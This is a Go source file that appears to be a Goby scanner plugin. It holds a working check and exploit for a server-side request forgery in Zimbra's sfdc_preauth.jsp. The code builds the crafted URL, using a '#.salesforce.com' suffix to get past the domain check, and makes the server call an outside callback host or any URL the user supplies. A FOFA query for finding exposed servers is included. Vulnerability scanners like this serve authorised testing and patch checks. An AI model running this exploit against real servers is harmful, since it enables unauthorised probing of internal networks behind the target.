package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"time"
)

func init() {
	expJson := `{
    "Name": "Zimbra Collaboration Suite sfdc_preauth.jsp SSRF",
    "Description": "<p>Zimbra Collaboration Suite (ZCS) is an open source collaborative office suite from Synacor, USA. This product includes WebMail, calendar, address book and so on.</p><p>Zimbra collaborative office system sfdc_preauth.jsp file has SSRF vulnerability, attackers can use the vulnerability to perform port detection and other attacks on the intranet.</p>",
    "Impact": "Zimbra Collaboration Suite sfdc_preauth.jsp SSRF",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.zimbra.com\">https://www.zimbra.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "Zimbra-Collaboration-Suite",
    "VulType": [
        "Server-Side Request Forgery"
    ],
    "Tags": [
        "Server-Side Request Forgery"
    ],
    "Translation": {
        "CN": {
            "Name": "Zimbra Collaboration Suite 协同办公系统 sfdc_preauth.jsp 文件服务器端请求伪造漏洞",
            "Description": "<p>Zimbra Collaboration Suite（ZCS）是美国Synacor公司的一款开源协同办公套件。该产品包括WebMail、日历、通信录等。</p><p>Zimbra协同办公系统sfdc_preauth.jsp文件存在SSRF漏洞，攻击者可利用漏洞对内网进行端口探测等攻击。</p>",
            "Impact": "<p>Zimbra协同办公系统sfdc_preauth.jsp文件存在SSRF漏洞，攻击者可利用漏洞对内网进行端口探测等攻击。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.zimbra.com\">https://www.zimbra.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "Zimbra-Collaboration-Suite",
            "VulType": [
                "服务器端请求伪造"
            ],
            "Tags": [
                "服务器端请求伪造"
            ]
        },
        "EN": {
            "Name": "Zimbra Collaboration Suite sfdc_preauth.jsp SSRF",
            "Description": "<p>Zimbra Collaboration Suite (ZCS) is an open source collaborative office suite from Synacor, USA. This product includes WebMail, calendar, address book and so on.</p><p>Zimbra collaborative office system sfdc_preauth.jsp file has SSRF vulnerability, attackers can use the vulnerability to perform port detection and other attacks on the intranet.</p>",
            "Impact": "Zimbra Collaboration Suite sfdc_preauth.jsp SSRF",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.zimbra.com\">https://www.zimbra.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "Zimbra-Collaboration-Suite",
            "VulType": [
                "Server-Side Request Forgery"
            ],
            "Tags": [
                "Server-Side Request Forgery"
            ]
        }
    },
    "FofaQuery": "banner=\"ZM_TEST=true\"",
    "GobyQuery": "banner=\"ZM_TEST=true\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.zimbra.com",
    "DisclosureDate": "2020-11-01",
    "References": [
        "https://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "ssrf",
            "type": "input",
            "value": "https://xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Zimbra-Collaboration-Suite"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10238"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			uri := "/service/error/sfdc_preauth.jsp?session=s&userid=1&server=https://" + checkUrl + "%23.salesforce.com/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			httpclient.DoHttpRequest(u, cfg)
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["ssrf"].(string)
			uri := "/service/error/sfdc_preauth.jsp?session=s&userid=1&server=" + cmd + "%23.salesforce.com/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 500 {
					expResult.Output = "it is a blind ssrf\n" + resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
